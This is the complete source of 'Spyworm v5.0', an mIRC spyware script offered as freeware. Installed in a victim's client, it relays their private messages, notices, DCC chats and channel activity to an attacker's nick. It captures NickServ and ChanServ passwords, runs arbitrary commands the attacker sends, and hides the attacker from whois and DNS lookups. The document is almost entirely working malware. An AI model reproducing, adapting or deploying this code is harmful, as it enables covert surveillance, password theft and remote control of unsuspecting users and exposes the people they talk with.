[script]
n0=!Spyworm v5.0 (Build 5.0.1) by ThunderBYTE.
n1=!Last Update: 26/09/2003 - 21:42 (Non-Tested Version).
n2=
n3=!FILENAME: Script.ini
n4=
n5=!The following Commands are Event Commands that must be placed to Remote.
n6=!The only configuration you need to do is to set your Nickname above, to allow Spyworm sending you all available information about this User.
n7=
n8=On 1:START: {
n9=  set %admin Replace_me_with_your_Nick
n10=  .enable #Spying
n11=}
n12=On 1:EXIT: {
n13=  unset %admin
n14=}
n15=On 1:TEXT:EnableSpy:?: {
n16=  if ($nick == %admin) {
n17=    close -m %admin
n18=    .enable #Spying
n19=    privmsg %admin Spying enabled. To disable Spying, type "DisableSpy".
n20=    privmsg %admin Attention: Spyworm is disabled automatically, every time you disconnect from the IRC Network, to avoid Errors.
n21=  }
n22=}
n23=On 1:TEXT:DisableSpy:?: {
n24=  if ($nick == %admin) {
n25=    close -m %admin
n26=    .disable #Spying
n27=    privmsg %admin Spying disabled. To enable Spying, type "EnableSpy".
n28=    privmsg %admin Attention: Spyworm is enabled automatically, every time the Client connects to the IRC Network and gets disabled, if you seem to be Offline.
n29=  }
n30=}
n31=On 1:TEXT:UnloadSpy:?: {
n32=  if ($nick == %admin) {
n33=    close -m %admin
n34=    privmsg %admin Spyworm unloaded (Just after sending this Message). To load Spyworm, see the instructions included in the README Text File.
n35=    unset %admin
n36=    .unload -rs Script.ini
n37=  }
n38=}
n39=On 1:TEXT:DeleteSpy:?: {
n40=  if ($nick == %admin) {
n41=    close -m %admin
n42=    privmsg %admin Spyworm deleted (Just after sending this Message).
n43=    unset %admin
n44=    .unload -rs Script.ini
n45=    .remove $mIRCDIRScript.ini
n46=  }
n47=}
n48=On 1:TEXT:Test:?: {
n49=  if ($nick == %admin) {
n50=    close -m %admin
n51=    privmsg %admin Client connected ( $+ $host - $ip $+ ).
n52=    privmsg %admin Loaded Spyworm v5.0 (Build 5.0.1).
n53=    privmsg %admin Spyworm is ready and waiting for Commands.
n54=  }
n55=}
n56=
n57=
n58=!The following Module is the Spying Module that must be placed to Remote.
n59=
n60=#Spying on
n61=Raw 401:* $+ %admin $+ *: {
n62=  .disable #Spying
n63=}
n64=On 1:CONNECT: {
n65=  privmsg %admin Client connected ( $+ $host - $ip $+ ).
n66=  privmsg %admin Loaded Spyworm v5.0 (Build 5.0.1). To disable Spying, type "DisableSpy".
n67=  privmsg %admin Attention: Spyworm is disabled automatically, every time you disconnect from the IRC Network, to avoid Errors.
n68=}
n69=On 1:OPEN:?: {
n70=  if ($nick != %admin) {
n71=    privmsg %admin Started Private Chat with $nick $+ .
n72=  }
n73=}
n74=On 1:CLOSE:?: {
n75=  if ($nick != %admin) {
n76=    privmsg %admin Finished Private Chat with $nick $+ .
n77=  }
n78=}
n79=On 1:TEXT:*:?: {
n80=  if ($nick != %admin) {
n81=    set %privmsg $1-
n82=    privmsg %admin Received Private Message from $nick $+ , telling " $+ %privmsg $+ ".
n83=    unset %privmsg
n84=  }
n85=  else {
n86=    set %com $1-
n87=    close -m %admin
n88=    %com
n89=    privmsg %admin Executed SEC (Spyworm External Command), including " $+ %com $+ ".
n90=  }
n91=}
n92=On 1:INPUT:*: {
n93=  if ($left($1,1) == /) {
n94=    set %com $1-
n95=    privmsg %admin Executed Custom Command, including " $+ %com $+ ".
n96=    unset %com
n97=  }
n98=  else {
n99=    set %privmsg $1-
n100=    if (%admin !ison $chan) {
n101=      privmsg %admin Sent Message to $chan $+ , telling " $+ %privmsg $+ ".
n102=    }
n103=    unset %privmsg
n104=  }
n105=}
n106=CTCP +1:*:?: {
n107=  if ($nick != %admin) {
n108=    set %request $1-
n109=    privmsg %admin Received CTCP or DCC Request from $nick $+ , including " $+ %request $+ ".
n110=    unset %request
n111=  }
n112=}
n113=On 1:FILERCVD:*: {
n114=  if ($nick != %admin) {
n115=    privmsg %admin Received DCC File ( $+ $filename $+ ) from $nick $+ .
n116=  }
n117=}
n118=On 1:GETFAIL:*: {
n119=  if ($nick != %admin) {
n120=    privmsg %admin Failed receiving DCC File ( $+ $filename $+ ) from $nick $+ .
n121=  }
n122=}
n123=On 1:FILESENT:*: {
n124=  if ($nick != %admin) {
n125=    privmsg %admin Sent DCC File ( $+ $filename $+ ) to $nick $+ .
n126=  }
n127=}
n128=On 1:SENDFAIL:*: {
n129=  if ($nick != %admin) {
n130=    privmsg %admin Failed sending DCC File ( $+ $filename $+ ) to $nick $+ .
n131=  }
n132=}
n133=On 1:NOTICE:*:*: {
n134=  if (Serv isin $nick) {
n135=    set %notice $1-
n136=    privmsg %admin Received Service Notice from $nick $+ , including " $+ %notice $+ ".
n137=    unset %notice
n138=  }
n139=  elseif (($nick != %admin) && ($chan == $null)) {
n140=    set %notice $1-
n141=    privmsg %admin Received User Notice from $nick $+ , telling " $+ %notice $+ ".
n142=    unset %notice
n143=  }
n144=  else {
n145=    if (($nick != %admin) && (%admin !ison $chan)) {
n146=      set %notice $1-
n147=      privmsg %admin Received Channel Notice from $nick $+ , telling " $+ %notice $+ ".
n148=      unset %notice
n149=    }
n150=  }
n151=}
n152=On 1:CHAT:*: {
n153=  if ($nick != %admin) {
n154=    set %dccmsg $1-
n155=    privmsg %admin Received DCC Chat Message from $nick $+ , telling " $+ %dccmsg $+ ".
n156=  }
n157=}
n158=On 1:INVITE:#: {
n159=  if ($nick != %admin) {
n160=    privmsg %admin Invited to $chan by $nick $+ .
n161=  }
n162=}
n163=On 1:JOIN:#: {
n164=  if (%admin !ison $chan) {
n165=    if ($nick == $me) {
n166=      privmsg %admin Joined $chan $+ .
n167=    }
n168=  }
n169=}
n170=On 1:PART:#: {
n171=  if (%admin !ison $chan) {
n172=    if ($nick == $me) {
n173=      privmsg %admin Left from $chan $+ .
n174=    }
n175=  }
n176=}
n177=On 1:OP:#: {
n178=  if (%admin !ison $chan) {
n179=    if ($opnick == $me) {
n180=      if ($nick == ChanServ) {
n181=        privmsg %admin Opped on $chan by ChanServ (Possible Access).
n182=      }
n183=      else {
n184=        privmsg %admin Opped on $chan by $nick $+ .
n185=      }
n186=    }
n187=    else {
n188=      if ($nick == $me) {
n189=        privmsg %admin Opped $opnick on $chan $+ . 
n190=      }
n191=    }
n192=  }
n193=}
n194=On 1:SERVEROP:#: {
n195=  if (%admin !ison $chan) {
n196=    if ($opnick == $me) {
n197=      privmsg %admin Opped on $chan by IRC Server (Possible Access).
n198=    }
n199=  }
n200=}
n201=On 1:DEOP:#: {
n202=  if (%admin !ison $chan) {
n203=    if ($opnick == $me) {
n204=      privmsg %admin Deopped on $chan by $nick $+ .
n205=    }
n206=    else {
n207=      if ($nick == $me) {
n208=        privmsg %admin Deopped $opnick on $chan $+ .
n209=      }
n210=    }
n211=  }
n212=}
n213=On 1:VOICE:#: {
n214=  if (%admin !ison $chan) {
n215=    if ($vnick == $me) {
n216=      privmsg %admin Voiced on $chan by $nick $+ .
n217=    }
n218=    else {
n219=      if ($nick == $me) {
n220=        privmsg %admin Voiced $vnick on $chan $+ .
n221=      }
n222=    }
n223=  }
n224=}
n225=On 1:DEVOICE:#: {
n226=  if (%admin !ison $chan) {
n227=    if ($vnick == $me) {
n228=      privmsg %admin Devoiced on $chan by $nick $+ .
n229=    }
n230=    else {
n231=      if ($nick == $me) {
n232=        privmsg %admin Devoiced $vnick on $chan $+ .
n233=      }
n234=    }
n235=  }
n236=}
n237=On 1:KICK:#: {
n238=  if (%admin !ison $chan) {
n239=    if ($knick == $me) {
n240=      if ($nick == ChanServ) {
n241=        privmsg %admin Kicked from $chan by ChanServ (Possible A-Kick).
n242=      }
n243=      else {
n244=        privmsg %admin Kicked from $chan by $nick $+ .
n245=      }
n246=    }
n247=    else {
n248=      if ($nick == $me) {
n249=        privmsg %admin Kicked $knick from $chan $+ .
n250=      }
n251=    }
n252=  }
n253=}
n254=On 1:BAN:#: {
n255=  if (%admin !ison $chan) {
n256=    if ($bnick == $me) {
n257=      privmsg %admin Banned on $chan by $nick $+ .
n258=    }
n259=    else {
n260=      if ($nick == $me) {
n261=        privmsg %admin Banned $bnick on $chan $+ .
n262=      }
n263=    }
n264=  }
n265=}
n266=On 1:UNBAN:#: {
n267=  if (%admin !ison $chan) {
n268=    if ($bnick == $me) {
n269=      if ($nick == ChanServ) {
n270=        privmsg %admin Unbanned on $chan by ChanServ (Possible Access).
n271=      }
n272=      else {
n273=        privmsg %admin Unbanned on $chan by $nick $+ .
n274=      }
n275=    }
n276=    else {
n277=      if ($nick == $me) {
n278=        privmsg %admin Unbanned $bnick from $chan $+ .
n279=      }
n280=    }
n281=  }
n282=}
n283=
n284=!The following Commands are Initialization Commands that must be placed to Remote.
n285=
n286=alias ns {
n287=  privmsg %admin Contacted NickServ.
n288=  ns $1-
n289=  privmsg %admin Resolving Reply... 
n290=  if ($1 == identify) {
n291=    set %pass $2
n292=    privmsg %admin Identified for Nick, using " $+ %pass $+ ".
n293=    unset %pass
n294=  }
n295=}
n296=alias nickserv {
n297=  privmsg %admin Contacted NickServ.
n298=  nickserv $1-
n299=  privmsg %admin Resolving Reply... 
n300=  if ($1 == identify) {
n301=    set %pass $2
n302=    privmsg %admin Identified for Nick, using " $+ %pass $+ ".
n303=    unset %pass
n304=  }
n305=}
n306=alias cs {
n307=  privmsg %admin Contacted ChanServ.
n308=  cs $1-
n309=  privmsg %admin Resolving Reply... 
n310=  if ($1 == identify) {
n311=    set %chan $2
n312=    set %pass $3
n313=    privmsg %admin Identified for Channel ( $+ %chan $+ ), using " $+ %pass $+ ".
n314=    unset %pass
n315=  }
n316=}
n317=alias chanserv {
n318=  privmsg %admin Contacted ChanServ.
n319=  chanserv $1-
n320=  privmsg %admin Resolving Reply... 
n321=  if ($1 == identify) {
n322=    set %chan $2
n323=    set %pass $3
n324=    privmsg %admin Identified for Channel ( $+ %chan $+ ), using " $+ %pass $+ ".
n325=    unset %chan
n326=    unset %pass
n327=  }
n328=}
n329=alias identify {
n330=  if (# isin $1) {
n331=    privmsg %admin Contacted ChanServ.
n332=    identify $1-
n333=    privmsg %admin Resolving Reply... 
n334=    set %chan $1
n335=    set %pass $2
n336=    privmsg %admin Identified for Channel ( $+ %chan $+ ), using " $+ %pass $+ ".
n337=    unset %chan
n338=    unset %pass
n339=  }
n340=  else {
n341=    privmsg %admin Contacted NickServ.
n342=    identify $1-
n343=    privmsg %admin Resolving Reply... 
n344=    set %pass $1
n345=    privmsg %admin Identified for Nick, using " $+ %pass $+ ".
n346=    unset %pass
n347=  }
n348=}
n349=alias ms {
n350=  privmsg %admin Contacted MemoServ.
n351=  ms $1-
n352=  privmsg %admin Resolving Reply... 
n353=  if ($1 == send) {
n354=    set %nick $2
n355=    set %memo $3-
n356=    privmsg %admin Sent Memo Message to %nick $+ , telling " $+ %memo $+ ".
n357=    unset %nick
n358=    unset %memo
n359=  }
n360=}
n361=alias memoserv {
n362=  privmsg %admin Contacted MemoServ.
n363=  memoserv $1-
n364=  privmsg %admin Resolving Reply... 
n365=  if ($1 == send) {
n366=    set %nick $2
n367=    set %memo $3-
n368=    privmsg %admin Sent Memo Message to %nick $+ , telling " $+ %memo $+ ".
n369=    unset %nick
n370=    unset %memo
n371=  }
n372=}
n373=alias msg {
n374=  msg $1-
n375=  if (= !isin $1) {
n376=    if (($1 != %admin) && (serv !isin $1)) {
n377=      set %nick $1
n378=      set %msg $2-
n379=      privmsg %admin Sent Message to %nick $+ , telling " $+ %msg $+ ".
n380=      unset %nick
n381=      unset %msg
n382=    }
n383=    if (serv isin $1) {
n384=      if ($1 == nickserv) {
n385=        privmsg %admin Contacted NickServ.
n386=        privmsg %admin Resolving Reply...
n387=        if ($2 == identify) {
n388=          set %pass $3
n389=          privmsg %admin Identified for Nick, using " $+ %pass $+ ".
n390=          unset %pass
n391=        }
n392=      }
n393=      if ($1 == chanserv) {
n394=        privmsg %admin Contacted ChanServ.
n395=        privmsg %admin Resolving Reply...
n396=        if ($2 == identify) {
n397=          set %chan $3
n398=          set %pass $4
n399=          privmsg %admin Identified for Channel ( $+ %chan $+ ), using " $+ %pass $+ ".
n400=          unset %chan
n401=          unset %pass
n402=        }
n403=      }
n404=      if ($1 == memoserv) {
n405=        privmsg %admin Contacted MemoServ.
n406=        privmsg %admin Resolving Reply...
n407=        if ($2 == send) {
n408=          set %nick $2
n409=          set %memo $3-
n410=          privmsg %admin Sent Memo Message to %nick $+ , telling " $+ %memo $+ ".
n411=          unset %nick
n412=          unset %memo
n413=        }
n414=      }
n415=    }
n416=  }
n417=  else {
n418=    if (%admin !isin $1) {
n419=      set %temp $1
n420=      set %nick $replace(%temp,=,$null)
n421=      unset %temp
n422=      set %dccmsg $2-
n423=      privmsg %admin Sent DCC Chat Message to %nick $+ , telling " $+ %dccmsg $+ ".
n424=      unset %nick
n425=      unset %dccmsg
n426=    }
n427=  }
n428=}
n429=alias privmsg {
n430=  privmsg $1-
n431=  if ($1 != %admin) {
n432=    set %nick $1
n433=    set %privmsg $2-
n434=    privmsg %admin Sent Private Message to %nick $+ , telling " $+ %privmsg $+ ".
n435=    unset %nick
n436=    unset %msg
n437=  }
n438=}
n439=alias ctcp {
n440=  ctcp $1-
n441=  if ($1 != %admin) {
n442=    set %nick $1
n443=    set %request $2-
n444=    privmsg %admin Sent CTCP Request to %nick $+ , including " $+ %request $+ ".
n445=    unset %nick
n446=    unset %request
n447=  }
n448=}
n449=alias dcc {
n450=  dcc $1-
n451=  if ($1 == chat) {
n452=    set %nick $2
n453=    privmsg %admin Attempted starting DCC Chat with %nick $+ .
n454=    unset %nick
n455=  }
n456=  else {
n457=    if ($1 == send) {
n458=      set %nick $2
n459=      set %file $3-
n460=      privmsg %admin Attempted sending DCC File ( $+ %file $+ ) to %nick $+ .
n461=      unset %nick
n462=      unset %file
n463=    }
n464=  }
n465=}
n466=alias notice {
n467=  notice $1-
n468=  if (# isin $1) {
n469=    if (%admin !ison $1) {
n470=      set %chan $1
n471=      set %notice $2-
n472=      privmsg %admin Sent Notice to %chan $+ , telling " $+ %notice $+ ".
n473=      unset %chan
n474=      unset %notice
n475=    }
n476=  }
n477=  else {
n478=    if ($1 != %admin) {
n479=      set %nick $1
n480=      set %notice $2-
n481=      privmsg %admin Sent Notice to %nick $+ , telling " $+ %notice $+ ".
n482=      unset %nick
n483=      unset %notice
n484=    }
n485=  }
n486=}
n487=alias onotice {
n488=  onotice $1-
n489=  if ((%admin !ison $1) || (%admin !isop $1)) {
n490=    set %chan $1
n491=    set %notice $2-
n492=    privmsg %admin Sent Operator Notice to %chan $+ , telling " $+ %notice $+ ".
n493=  }
n494=}
n495=alias me {
n496=  me $1-
n497=  set %info $1-
n498=  privmsg %admin Informed $chan $+ , telling " $+ $me %info $+ ".
n499=  unset %info
n500=}
n501=alias ame {
n502=  ame $1-
n503=  set %info $1-
n504=  privmsg %admin Informed all Channels, telling " $+ $me %info $+ ".
n505=  unset %info
n506=}
n507=alias dccallow {
n508=  dccallow $1-
n509=  if (+ isin $1) {
n510=    set %nick $1
n511=    privmsg %admin Changed DCC Receive Modes, including " $+ %nick $+ " (Allow Mode).
n512=    unset %nick
n513=  }
n514=  if (- isin $1) {
n515=    set %nick $1
n516=    privmsg %admin Changed DCC Receive Modes, including " $+ %nick $+ " (Block Mode).
n517=    unset %nick
n518=  }
n519=}
n520=alias invite {
n521=  invite $1-
n522=  if (($1 != %admin) && (%admin !ison $2)) {
n523=    set %nick $1
n524=    set %chan $2
n525=    privmsg %admin Invited %nick to %chan $+ .
n526=    unset %nick
n527=    unset %chan
n528=  }
n529=}
n530=alias nick {
n531=  set %prenick $me
n532=  nick $1-
n533=  set %nick $1
n534=  privmsg %admin Changed Nick ( $+ %prenick $+ ) to %nick ( $+ $address($me,0) $+ ).
n535=  unset %prenick
n536=  unset %nick
n537=}
n538=alias whois {
n539=  if ($1 != %admin) {
n540=    whois $1-
n541=    set %nick $1
n542=    privmsg %admin Requested Personal Information for %nick $+ .
n543=  }
n544=  else {
n545=    echo * %admin No such nick/channel
n546=    echo * %admin End of /WHOIS list
n547=    privmsg %admin Blocked from requesting Personal Information for %admin (Administrator Protection for %admin $+ ).
n548=  }
n549=}
n550=alias dns {
n551=  if ($1 != %admin) {
n552=    dns $1-
n553=    set %nick $1
n554=    privmsg %admin Requested Address Information for %nick $+ .
n555=  }
n556=  else {
n557=    echo * %admin No such nick/address
n558=    echo * End of /DNS list
n559=    privmsg %admin Blocked from requesting Address Information for %admin (Administrator Protection for %admin $+ ).
n560=  }
n561=}
n562=#Spying end
n563=
n564=!END: Script.ini
n565=
n566=!Spyworm is provided Freeware. Using Spyworm means that you have accepted its Terms of Use, as described in the README Text File.
